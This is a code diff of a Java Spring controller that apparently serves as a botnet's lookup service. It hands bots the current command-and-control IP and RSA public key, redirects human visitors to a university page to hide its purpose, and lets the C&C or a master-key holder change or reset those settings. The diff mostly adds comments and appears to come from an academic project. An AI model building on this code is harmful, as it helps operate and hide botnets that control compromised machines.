@@ -37,16 +37,24 @@ public class DNSController {
 	@Autowired
 	public IP ipCec;
 
+	
+	/**
+	 * Connect to service. DNS behavior.
+	 * 
+	 * @param req
+	 * @param error
+	 * @return
+	 * @throws IOException
+	 */
 	@RequestMapping(value = "/ciaosonounbot", method = RequestMethod.POST)
 	public @ResponseBody Pairs<String, String> connectBot(HttpServletRequest req, HttpServletResponse error) throws IOException {
 		Pairs<String, String> answ = new Pairs<String, String>();
 		System.out.println(pubKey);
-		if(pubKey!=null){
+		if(pubKey!=null){ // if C&C is set return its values 
 			answ.setValue1(ipCec.toString());
 			String key = Base64.encodeBase64String(pubKey.getEncoded());
 			answ.setValue2(key);
-		} else {
-//			error.setHeader("Location", "/error");
+		} else { // if doesn't can't return anything
 			answ.setValue1("");
 			answ.setValue2("");
 		}
@@ -54,51 +62,68 @@ public class DNSController {
 		return answ;
 	}
 
-//	@RequestMapping(value = "/ciccio")
-//	public @ResponseBody HashMap<String, String> ciccio(){
-//		HashMap<String, String> prova = new HashMap<String, String>();
-//	}
-	
+	/**
+	 * Fake page return for tests. GET method.
+	 * 
+	 * @return
+	 */
 	@RequestMapping(value = "/ciaosonounumano")
 	public ModelAndView connectHuman() {
 		return new ModelAndView("redirect:" + "http://www.cs.uniroma2.it/");
 	}
 
+	/**
+	 * Evoked to change C&C settings and for first requested update. Store IP and public key.
+	 * 
+	 * @param cec
+	 * @param req
+	 * @return
+	 * @throws NoSuchAlgorithmException
+	 * @throws NoSuchProviderException
+	 * @throws InvalidKeySpecException
+	 */
 	@RequestMapping(value = "/alter", method = RequestMethod.POST)
 	@ResponseBody
 	public Boolean alter(@RequestBody Pairs<IP, String> cec, HttpServletRequest req) throws NoSuchAlgorithmException, NoSuchProviderException, InvalidKeySpecException {
 		System.out.println(req.getRemoteAddr());
 		System.out.println(ipCec.getIp());
-		if (req.getRemoteAddr().equals(ipCec.getIp())) {
+		if (req.getRemoteAddr().equals(ipCec.getIp())) { // if request is send from actual C&C then set new C&C
 			Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
 			KeyFactory fact = KeyFactory.getInstance("RSA", "BC");
 			byte[] encoded = Base64.decodeBase64(cec.getValue2());
 			pubKey = fact.generatePublic(new X509EncodedKeySpec(encoded));
 			ipCec.setIp(cec.getValue1().toString());
 			System.out.println("C&C updated correctly.");
-			if (flag) {
+			if (flag) { // first access, storage of default values
 				System.out.println("First access: setting default values.");
 				defaultCCIp = ipCec;
 				defaultCCPubKey = pubKey;
 				flag = false;
 			}
 			return true;
-		} else {
+		} else { // any request from other bots
 			System.out.println("ALTER failed.");
 			return false;
 		}
 	}
 	
+	/**
+	 * Reset C&C with last default values saved.
+	 * 
+	 * @param resetKey
+	 * @param req
+	 * @return
+	 */
 	@RequestMapping(value = "/reset", method = RequestMethod.POST)
 	@ResponseBody
 	public Boolean reset(@RequestBody String resetKey, HttpServletRequest req){
 		System.out.println(resetKey);
-		if(resetKey.equals(resetMasterKey)){
+		if(resetKey.equals(resetMasterKey)){ // if master key for reset is correctly given from who made this request
 			ipCec = defaultCCIp;
 			pubKey = defaultCCPubKey;
 			System.out.println("C&C resettato da " + req.getRemoteAddr() + ":" + req.getRemotePort());
 			return true;
-		} else {
+		} else { // any other request with wrong or null master key as parameter
 			System.out.println("RESET failed.");
 			return false;
 		}
